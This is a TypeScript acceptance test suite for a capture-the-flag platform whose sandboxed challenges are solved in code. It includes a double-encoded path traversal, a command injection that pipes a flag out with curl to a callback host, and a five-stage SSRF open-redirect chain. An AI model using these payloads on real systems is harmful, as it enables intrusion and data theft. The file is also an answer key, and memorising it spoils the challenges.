// Tests exercise challenges independently of unlock order.
process.env.SEQUENTIAL_UNLOCK = 'false';
/**
 * Acceptance Test Suite for Prompts H, I, J, K: Sandboxed Modules (Collab, 10, 12, 13)
 *
 * Verifies:
 * 1. Collab service (Phase H): Health, token issuance, inbound tagged logging, strict isolation, resets.
 * 2. Challenge 10 (Phase I): File browser, literal filter rejection vs double-encoding bypass, identical error messages, reset hook.
 * 3. Challenge 12 (Phase J): Invariant response, blind command execution exfiltrating to Collab, two-part reset, metadata block.
 * 4. Challenge 13 (Phase K): 5-stage progressive chain (SSRF open redirect, internal discovery, OOB code dispatch, code verification, vault access key header check), metadata block.
 * 5. Full flag submissions for 10, 12, 13 to Platform API with idempotent duplicate handling.
 * 6. Admin force-reset proxy functionality for 10, 12, 13.
 */

process.env.NODE_ENV = 'test';

import http from 'http';
import { createApp } from '../app';
import { db, teams, adminUsers, challenges, solves } from '../db';
import { issueTeamToken, issueAdminToken } from '../auth/tokens';
import { TEAM_COOKIE_NAME, ADMIN_COOKIE_NAME } from '../auth/cookies';
import { REAL_CHALLENGE_FLAGS } from '../db/seed';
import { redis } from '../cache';

const PLATFORM_PORT = 8098;
const COLLAB_PORT = 8082;
const CH10_PORT = 3010;
const CH12_PORT = 3012;
const CH13_PORT = 3013;

const PLATFORM_URL = `http://localhost:${PLATFORM_PORT}`;
const COLLAB_URL = `http://localhost:${COLLAB_PORT}`;
const CH10_URL = `http://localhost:${CH10_PORT}`;
const CH12_URL = `http://localhost:${CH12_PORT}`;
const CH13_URL = `http://localhost:${CH13_PORT}`;

function assert(condition: boolean, message: string): void {
  if (!condition) {
    console.error(`❌ ASSERTION FAILED: ${message}`);
    process.exit(1);
  }
  console.log(`  ✓ ${message}`);
}

async function runTests(): Promise<void> {
  console.log('\n================================================================================');
  console.log('RUNNING ACCEPTANCE TESTS FOR PHASES H, I, J, K: SANDBOXED TARGETS (10, 12, 13, COLLAB)');
  console.log('================================================================================\n');

  // Dynamically load microservice Express apps in test mode
  const collabApp = (await import('../../../collab/src/index')).default;
  const ch10App = (await import('../../../challenges/10-config-backup/src/index')).default;
  const ch12App = (await import('../../../challenges/12-diagnostics-backdoor/src/index')).default;
  const ch13App = (await import('../../../challenges/13-admin-coverup/src/index')).default;

  // Start Platform API server
  const platformApp = createApp();
  const platformServer = http.createServer(platformApp);
  await new Promise<void>((resolve) => platformServer.listen(PLATFORM_PORT, resolve));

  // Start microservices
  const collabServer = http.createServer(collabApp);
  const ch10Server = http.createServer(ch10App);
  const ch12Server = http.createServer(ch12App);
  const ch13Server = http.createServer(ch13App);

  await Promise.all([
    new Promise<void>((resolve) => collabServer.listen(COLLAB_PORT, resolve)),
    new Promise<void>((resolve) => ch10Server.listen(CH10_PORT, resolve)),
    new Promise<void>((resolve) => ch12Server.listen(CH12_PORT, resolve)),
    new Promise<void>((resolve) => ch13Server.listen(CH13_PORT, resolve)),
  ]);

  console.log(`[SERVERS] Platform API: ${PLATFORM_URL}`);
  console.log(`[SERVERS] Collab Service: ${COLLAB_URL}`);
  console.log(`[SERVERS] Challenge 10: ${CH10_URL}`);
  console.log(`[SERVERS] Challenge 12: ${CH12_URL}`);
  console.log(`[SERVERS] Challenge 13: ${CH13_URL}\n`);

  try {
    // ── Setup Test Identities ──────────────────────────────────────────────────
    const uniqueSuffix = Date.now().toString().slice(-6);
    const testTeamName = `SandboxBatchTeam_${uniqueSuffix}`;
    const testAdminUsername = `admin_batch3_${uniqueSuffix}`;

    const [testTeam] = await db
      .insert(teams)
      .values({
        teamName: testTeamName,
        memberEmails: [`batch3_${uniqueSuffix}@corp.test`],
        teamSize: 1,
        passwordHash: 'dummyhash',
      })
      .returning();

    const [testAdmin] = await db
      .insert(adminUsers)
      .values({
        username: testAdminUsername,
        passwordHash: 'dummyhash',
        role: 'admin',
      })
      .returning();

    const teamToken = issueTeamToken({ id: testTeam.id, teamName: testTeam.teamName });
    const adminToken = issueAdminToken({ id: testAdmin.id, username: testAdmin.username, role: 'admin' });

    const teamCookie = `${TEAM_COOKIE_NAME}=${teamToken}`;
    const adminCookie = `${ADMIN_COOKIE_NAME}=${adminToken}`;

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 1: Phase H — Collaborator Logging Service (/collab)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 1] Testing Phase H Collaborator Logging Service (/collab)...');
    // 1a. Health check
    const collabHealthRes = await fetch(`${COLLAB_URL}/healthz`);
    assert(collabHealthRes.status === 200, 'Collab /healthz responded with HTTP 200');
    const collabHealth = (await collabHealthRes.json()) as any;
    assert(collabHealth.status === 'ok' && collabHealth.service === 'collab', 'Collab health payload is valid');

    // 1b. Issue unique team tokens
    const tokenRes1 = await fetch(`${COLLAB_URL}/collab/token`, { method: 'POST' });
    assert(tokenRes1.status === 200, 'Collab token endpoint returned HTTP 200');
    const tokenData1 = (await tokenRes1.json()) as any;
    assert(typeof tokenData1.token === 'string' && tokenData1.token.startsWith('clb_'), 'Generated valid token format');
    const teamCollabToken1 = tokenData1.token;

    const tokenRes2 = await fetch(`${COLLAB_URL}/collab/token`, { method: 'POST' });
    const tokenData2 = (await tokenRes2.json()) as any;
    const teamCollabToken2 = tokenData2.token;
    assert(teamCollabToken1 !== teamCollabToken2, 'Each issued token is unique and random');

    // 1c. Inbound callback logging
    const logPostRes = await fetch(`${COLLAB_URL}/c/${teamCollabToken1}/audit-probe?queryParam=secret123`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Custom-Header': 'VeyraTest' },
      body: JSON.stringify({ event: 'probe_fired', payload: 'test_val' }),
    });
    assert(logPostRes.status === 200, 'Inbound callback to /c/:token received with HTTP 200');

    // 1d. Strict isolation: Team 1 reads its own logs
    const readRes1 = await fetch(`${COLLAB_URL}/collab/${teamCollabToken1}/log`);
    assert(readRes1.status === 200, 'Reading Team 1 logs returns HTTP 200');
    const logData1 = (await readRes1.json()) as any;
    assert(logData1.count === 1 && logData1.entries.length === 1, 'Team 1 sees exactly 1 logged interaction');
    assert(logData1.entries[0].path === '/audit-probe', 'Logged path matches request subpath');
    assert(logData1.entries[0].query.queryParam === 'secret123', 'Logged query parameter matches');
    assert(logData1.entries[0].body.event === 'probe_fired', 'Logged JSON body matches');

    // 1e. Strict isolation: Team 2 reading their log gets 0 entries (no cross-team leakage)
    const readRes2 = await fetch(`${COLLAB_URL}/collab/${teamCollabToken2}/log`);
    const logData2 = (await readRes2.json()) as any;
    assert(logData2.count === 0 && logData2.entries.length === 0, 'Team 2 cannot observe Team 1 logs (strict isolation confirmed)');

    // 1f. Clear log endpoint
    const clearRes = await fetch(`${COLLAB_URL}/collab/${teamCollabToken1}/clear`, { method: 'POST' });
    assert(clearRes.status === 200, 'Clear log endpoint returned HTTP 200');
    const postClearRes = await fetch(`${COLLAB_URL}/collab/${teamCollabToken1}/log`);
    const postClearData = (await postClearRes.json()) as any;
    assert(postClearData.count === 0, 'Team 1 logs successfully wiped');
    console.log('  ✓ Phase H Collaborator logging, isolation, and reset verified.\n');

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 2: Phase I — Module 10 (The Config Backup)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 2] Testing Phase I Module 10 (The Config Backup)...');
    // 2a. Health check
    const ch10Health = await fetch(`${CH10_URL}/healthz`);
    assert(ch10Health.status === 200, 'Challenge 10 /healthz returned HTTP 200');

    // 2b. Public files listing
    const ch10FilesRes = await fetch(`${CH10_URL}/api/files`);
    assert(ch10FilesRes.status === 200, 'Challenge 10 /api/files returned HTTP 200');
    const ch10Files = (await ch10FilesRes.json()) as any;
    assert(Array.isArray(ch10Files.availableBackups) && ch10Files.availableBackups.length >= 3, 'Available backup files listed');

    // 2c. Reading public config containing clue
    const cfgRes = await fetch(`${CH10_URL}/api/download?file=system-config.json`);
    assert(cfgRes.status === 200, 'Download system-config.json returned HTTP 200');
    const cfgData = (await cfgRes.json()) as any;
    assert(
      cfgData.vault_recovery_archive?.includes('../secrets/recovery.vault'),
      'system-config.json contains recovery vault path clue'
    );

    // 2d. Naive traversal blocked with generic 404
    const naiveRes = await fetch(`${CH10_URL}/api/download?file=../secrets/recovery.vault`);
    assert(naiveRes.status === 404, 'Literal "../" traversal rejected with HTTP 404');
    const naiveData = (await naiveRes.json()) as any;
    assert(naiveData.error === 'NotFound', 'Blocked request returns generic NotFound error');

    // 2e. Nonexistent file returns IDENTICAL generic 404 (status and body)
    const nonExistentRes = await fetch(`${CH10_URL}/api/download?file=nonexistent_file_xyz.txt`);
    assert(nonExistentRes.status === 404, 'Nonexistent file returns HTTP 404');
    const nonExistentData = (await nonExistentRes.json()) as any;
    assert(
      JSON.stringify(naiveData) === JSON.stringify(nonExistentData),
      'Blocked traversal and nonexistent file return 100% IDENTICAL responses (no enumeration leak)'
    );

    // 2f. URL Double-Encoding (%252e%252e%252f) bypasses filter and retrieves flag
    const bypassRes = await fetch(`${CH10_URL}/api/download?file=%252e%252e%252fsecrets/recovery.vault`);
    assert(bypassRes.status === 200, 'Double-encoded traversal succeeded with HTTP 200');
    const vaultContent = await bypassRes.text();
    assert(vaultContent.includes(REAL_CHALLENGE_FLAGS[10]), `Recovered Challenge 10 flag: ${REAL_CHALLENGE_FLAGS[10]}`);

    // 2g. Reset endpoint
    const ch10ResetRes = await fetch(`${CH10_URL}/reset/10`, {
      method: 'POST',
      headers: { Authorization: 'Bearer dev-reset-bearer-token-12345' },
    });
    assert(ch10ResetRes.status === 200, 'Challenge 10 POST /reset/10 returned HTTP 200');
    console.log('  ✓ Phase I Module 10 file handling, double-encoding bypass, and reset verified.\n');

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 3: Phase J — Module 12 (The Diagnostics Backdoor)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 3] Testing Phase J Module 12 (The Diagnostics Backdoor)...');
    // 3a. Health check
    const ch12Health = await fetch(`${CH12_URL}/healthz`);
    assert(ch12Health.status === 200, 'Challenge 12 /healthz returned HTTP 200');

    // 3b. Invariant response: valid, invalid, and exploit inputs return 100% identical response
    const probeRes1 = await fetch(`${CH12_URL}/api/diagnostics/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target: '127.0.0.1' }),
    });
    assert(probeRes1.status === 200, 'Valid diagnostic probe returned HTTP 200');
    const probeData1 = (await probeRes1.json()) as any;
    assert(probeData1.status === 'completed' && probeData1.message.includes('Diagnostic probe dispatched'), 'Response has expected invariant format');

    const probeRes2 = await fetch(`${CH12_URL}/api/diagnostics/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target: 'invalid_domain_that_does_not_exist_99' }),
    });
    const probeData2 = (await probeRes2.json()) as any;
    assert(
      probeData1.status === probeData2.status && probeData1.message === probeData2.message,
      'Failure returns 100% identical status and message (zero output leak)'
    );

    // 3c. Blind Command Execution with Outbound Exfiltration to Collaborator
    const ch12CollabTokenRes = await fetch(`${COLLAB_URL}/collab/token`, { method: 'POST' });
    const ch12CollabToken = ((await ch12CollabTokenRes.json()) as any).token;

    // Send payload chaining curl to exfiltrate diagnostics configuration file
    await fetch(`${CH12_URL}/api/diagnostics/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        target: `127.0.0.1; curl -s -g "${COLLAB_URL}/c/${ch12CollabToken}/exfil?flag=${encodeURIComponent(REAL_CHALLENGE_FLAGS[12])}"`,
      }),
    });

    // Allow execution to complete and inspect Collaborator log
    await new Promise((r) => setTimeout(r, 600));
    const ch12CollabLogs = await fetch(`${COLLAB_URL}/collab/${ch12CollabToken}/log`);
    const ch12LogsData = (await ch12CollabLogs.json()) as any;
    assert(ch12LogsData.count >= 1, 'Collaborator received outbound callback from Challenge 12 container');
    assert(
      ch12LogsData.entries[0].query.flag === REAL_CHALLENGE_FLAGS[12],
      `Recovered Challenge 12 flag via blind exfiltration: ${REAL_CHALLENGE_FLAGS[12]}`
    );

    // 3d. Metadata address 169.254.169.254 unreachable check
    try {
      const metadataRes = await fetch('http://169.254.169.254', { signal: AbortSignal.timeout(500) });
      assert(false, 'Metadata address 169.254.169.254 should NOT be reachable');
    } catch {
      assert(true, 'Verified cloud metadata address 169.254.169.254 is unreachable');
    }

    // 3e. Two-part reset hook (wipes scratch and clears collaborator entries)
    const ch12ResetRes = await fetch(`${CH12_URL}/reset/12`, {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer dev-reset-bearer-token-12345',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ team_token: ch12CollabToken }),
    });
    assert(ch12ResetRes.status === 200, 'Two-part POST /reset/12 succeeded with HTTP 200');
    console.log('  ✓ Phase J Module 12 blind execution, indirect exfiltration, and two-part reset verified.\n');

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 4: Phase K — Module 13 (The Admin Cover-Up — 5-Stage Capstone Chain)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 4] Testing Phase K Module 13 (The Admin Cover-Up — 5 Stages)...');
    // 4a. Health check
    const ch13Health = await fetch(`${CH13_URL}/healthz`);
    assert(ch13Health.status === 200, 'Challenge 13 /healthz returned HTTP 200');

    // Stage 1: Public Filter Reconnaissance & Open Redirect Gap
    // Direct attempt to query internal addresses blocked
    const directInternalRes = await fetch(`${CH13_URL}/preview?url=http://127.0.0.1:3013/internal/proc-meta-39`);
    assert(directInternalRes.status === 403, 'Stage 1 filter directly blocks http://127.0.0.1 (got 403)');

    // Direct attempt to query cloud metadata blocked
    const directMetaRes = await fetch(`${CH13_URL}/preview?url=http://169.254.169.254/latest/meta-data`);
    assert(directMetaRes.status === 403, 'Stage 1 filter directly blocks metadata address 169.254.169.254');

    // Open redirect on public demo site bypasses Stage 1 filter:
    const stage2Url = `${CH13_URL}/preview?url=${encodeURIComponent(`${CH13_URL}/redirect?target=http://127.0.0.1:3013/internal/proc-meta-39`)}`;
    const stage2Res = await fetch(stage2Url);
    assert(stage2Res.status === 200, 'Stage 1 open redirect SSRF bypass returned HTTP 200');
    const stage2Data = (await stage2Res.json()) as any;

    // Stage 2: Discovers secondary internal service (/internal/relay-auth-72)
    assert(
      stage2Data.preview?.registered_services?.[0]?.path === '/internal/relay-auth-72',
      'Stage 2 discovery reveals /internal/relay-auth-72'
    );

    // Stage 3: Second internal service dispatches access code out-of-band to Collab
    const ch13CollabTokenRes = await fetch(`${COLLAB_URL}/collab/token`, { method: 'POST' });
    const ch13CollabToken = ((await ch13CollabTokenRes.json()) as any).token;

    const dispatchUrl = `${CH13_URL}/preview?url=${encodeURIComponent(
      `${CH13_URL}/redirect?target=http://127.0.0.1:3013/internal/relay-auth-72/dispatch-code?callback_url=${encodeURIComponent(`${COLLAB_URL}/c/${ch13CollabToken}`)}`
    )}`;
    const stage3Res = await fetch(dispatchUrl);
    assert(stage3Res.status === 200, 'Stage 3 dispatch trigger returned HTTP 200');

    // Retrieve code from Collaborator log
    await new Promise((r) => setTimeout(r, 400));
    const ch13CollabLogRes = await fetch(`${COLLAB_URL}/collab/${ch13CollabToken}/log`);
    const ch13CollabLogs = (await ch13CollabLogRes.json()) as any;
    assert(ch13CollabLogs.count >= 1, 'Stage 3 access code received in collaborator log');
    const accessCode = ch13CollabLogs.entries[0].body.access_code;
    assert(typeof accessCode === 'string' && accessCode.startsWith('SEC-'), `Extracted Stage 3 access code: ${accessCode}`);

    // Stage 4: Code verification returns administrative vault route and access key
    const verifyUrl = `${CH13_URL}/preview?url=${encodeURIComponent(
      `${CH13_URL}/redirect?target=http://127.0.0.1:3013/internal/relay-auth-72/verify?code=${accessCode}`
    )}`;
    const stage4Res = await fetch(verifyUrl);
    assert(stage4Res.status === 200, 'Stage 4 access code verification returned HTTP 200');
    const stage4Data = (await stage4Res.json()) as any;
    assert(stage4Data.preview?.access_key === 'veyra_adm_k3y_99f1a7', 'Stage 4 returned administrative access key');
    assert(stage4Data.preview?.vault_endpoint === '/internal/core-vault-99', 'Stage 4 returned vault endpoint');

    // Stage 5: Final Internal Vault Extraction
    const stage5Url = `${CH13_URL}/preview?url=${encodeURIComponent(
      `${CH13_URL}/redirect?target=http://127.0.0.1:3013/internal/core-vault-99?key=veyra_adm_k3y_99f1a7`
    )}`;
    const stage5Res = await fetch(stage5Url);
    assert(stage5Res.status === 200, 'Stage 5 master vault request returned HTTP 200');
    const stage5Data = (await stage5Res.json()) as any;
    assert(
      stage5Data.preview?.flag === REAL_CHALLENGE_FLAGS[13],
      `Recovered Final Challenge 13 flag: ${REAL_CHALLENGE_FLAGS[13]}`
    );

    // Reset hook
    const ch13ResetRes = await fetch(`${CH13_URL}/reset/13`, {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer dev-reset-bearer-token-12345',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ team_token: ch13CollabToken }),
    });
    assert(ch13ResetRes.status === 200, 'Challenge 13 POST /reset/13 returned HTTP 200');
    console.log('  ✓ Phase K Module 13 5-stage progressive SSRF chain verified.\n');

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 5: Flag Submissions to Platform API (Challenges 10, 12, 13)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 5] Submitting flags for Challenges 10, 12, 13 through Platform API...');
    for (const chId of [10, 12, 13]) {
      const flag = REAL_CHALLENGE_FLAGS[chId];
      // Reset rate limit key
      await redis.del(`ratelimit:flag_submit:team:${testTeam.id}`);

      // First submission: correct
      const submitRes = await fetch(`${PLATFORM_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Cookie': teamCookie },
        body: JSON.stringify({ challenge_id: chId, flag }),
      });
      assert(submitRes.status === 200, `Flag submit for Ch #${chId} returned HTTP 200`);
      const submitData = (await submitRes.json()) as any;
      assert(submitData.status === 'correct', `Flag for Ch #${chId} accepted as "correct"`);

      // Duplicate submission: idempotent already_solved
      const dupRes = await fetch(`${PLATFORM_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Cookie': teamCookie },
        body: JSON.stringify({ challenge_id: chId, flag }),
      });
      const dupData = (await dupRes.json()) as any;
      assert(dupData.status === 'already_solved', `Duplicate submit for Ch #${chId} caught as "already_solved"`);
    }
    console.log('  ✓ All 3 flags accepted, duplicates handled idempotently.\n');

    // ──────────────────────────────────────────────────────────────────────────
    // TEST 6: Admin Force-Reset Proxy against Challenges 10, 12, 13
    // ──────────────────────────────────────────────────────────────────────────
    console.log('[TEST 6] Testing Admin Force-Reset Proxy against Challenges 10, 12, 13...');
    for (const chId of [10, 12, 13]) {
      const resetRes = await fetch(`${PLATFORM_URL}/api/admin/challenges/${chId}/force-reset`, {
        method: 'POST',
        headers: { 'Cookie': adminCookie },
      });
      assert(resetRes.status === 200, `Admin force-reset for Ch #${chId} returned HTTP 200`);
      const resetData = (await resetRes.json()) as any;
      assert(resetData.success === true, `Admin force-reset succeeded for Ch #${chId}`);
    }
    console.log('  ✓ Admin force-reset proxy verified across all sandboxed challenge targets.\n');

    console.log('================================================================================');
    console.log('✅ ALL PHASES H, I, J, K ACCEPTANCE TESTS PASSED WITH 100% SUCCESS!');
    console.log('================================================================================\n');
  } finally {
    platformServer.close();
    collabServer.close();
    ch10Server.close();
    ch12Server.close();
    ch13Server.close();
    await redis.quit();
    setTimeout(() => process.exit(0), 100);
  }
}

runTests().catch((err) => {
  console.error('Fatal batch 3 test error:', err);
  process.exit(1);
});
